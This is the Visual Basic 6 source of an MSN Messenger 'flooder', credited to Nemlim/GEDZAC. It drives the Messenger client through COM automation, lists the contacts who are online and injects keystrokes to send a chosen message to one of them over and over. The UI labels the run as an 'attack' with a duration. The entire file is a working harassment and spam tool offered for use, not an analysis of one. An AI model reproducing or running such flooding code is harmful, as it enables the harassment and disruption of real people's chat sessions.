VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "M5N Flooder"
   ClientHeight    =   3735
   ClientLeft      =   3405
   ClientTop       =   2580
   ClientWidth     =   3450
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3735
   ScaleWidth      =   3450
   Begin VB.ComboBox Combo2 
      Height          =   315
      ItemData        =   "Form1.frx":030A
      Left            =   2010
      List            =   "Form1.frx":034A
      Style           =   2  'Dropdown List
      TabIndex        =   5
      Top             =   870
      Width           =   1305
   End
   Begin VB.Timer Timer1 
      Interval        =   5000
      Left            =   180
      Top             =   810
   End
   Begin VB.CommandButton Command1 
      Caption         =   "GoGoGo"
      Height          =   375
      Left            =   150
      TabIndex        =   3
      Top             =   3210
      Width           =   3195
   End
   Begin VB.TextBox Text1 
      Height          =   1785
      Left            =   150
      MaxLength       =   1000
      MultiLine       =   -1  'True
      TabIndex        =   2
      Text            =   "Form1.frx":03A9
      Top             =   1290
      Width           =   3165
   End
   Begin VB.ComboBox Combo1 
      Height          =   315
      Left            =   150
      Style           =   2  'Dropdown List
      TabIndex        =   1
      Top             =   450
      Width           =   3165
   End
   Begin VB.Label Label2 
      Caption         =   "Duracion del ataque:"
      Height          =   225
      Left            =   180
      TabIndex        =   4
      Top             =   900
      Width           =   2025
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "M5N Flooder by Nemlim/GEDZAC"
      ForeColor       =   &H00E0E0E0&
      Height          =   195
      Left            =   0
      TabIndex        =   0
      Top             =   120
      Width           =   3435
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Const msnOnline = 2
Const msnOffline = 1
Dim w As Object
Private Sub SpamMsn(ByVal mHwnd)
On Error Resume Next
Dim l As Long, spam As String, i As Long
l = FindWindowEx(mHwnd, 0, "DirectUIHWND", vbNullString)
If l = 0 Then Exit Sub
For i = 1 To Val(Combo2.Text)
    Call SendText(l, Text1.Text, True, True)
    DoEvents
Next
Exit Sub
End Sub
Public Sub SendText(pIMWindow As Long, sText As String, Optional bSend As Boolean = False, Optional bKeepFocus As Boolean = True)
Dim hDirectUI As Long, hPrevWnd As Long
Dim i As Integer
hDirectUI = pIMWindow
hPrevWnd = GetForegroundWindow
Do
    Call SetForegroundWindow(hDirectUI)
Loop Until GetForegroundWindow = hDirectUI

For i = 1 To Len(sText)
    Call PostMessage(hDirectUI, WM_CHAR, Asc(Mid(sText, i, 1)), 0&)
Next i
If bSend Then
    Call PostMessage(hDirectUI, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(hDirectUI, WM_KEYUP, VK_RETURN, 0&)
End If
If Not bKeepFocus Then
    Call SetForegroundWindow(hPrevWnd)
End If
End Sub

Private Sub Command1_Click()
Dim i As Long
Dim iMsn As Object
i = MsgBox("Mientras se realiza el floodeo el sistema dejara de responder por unos segundos; procure no tocar nada." & vbCrLf & "Esta seguro de que desea proseguir?", vbYesNo)
    If i = 6 Then
        Set iMsn = w.InstantMessage(Combo1.Text)
        Call SpamMsn(iMsn.hwnd)
    End If
End Sub

Private Sub Form_Load()
On Error GoTo NotCompatible
Dim ConTacto As Object
Set w = CreateObject("Messenger.UIAutomation")
    For Each ConTacto In w.MyContacts
        If ConTacto.Status = msnOnline Then
            Combo1.AddItem ConTacto.SigninName
        End If
    Next
Combo2.ListIndex = 9

Exit Sub
NotCompatible:
MsgBox "No tienes MSN instalado en el sistema", vbCritical, "Error"
End
End Sub

Private Sub Form_Unload(Cancel As Integer)
Set w = Nothing
End Sub
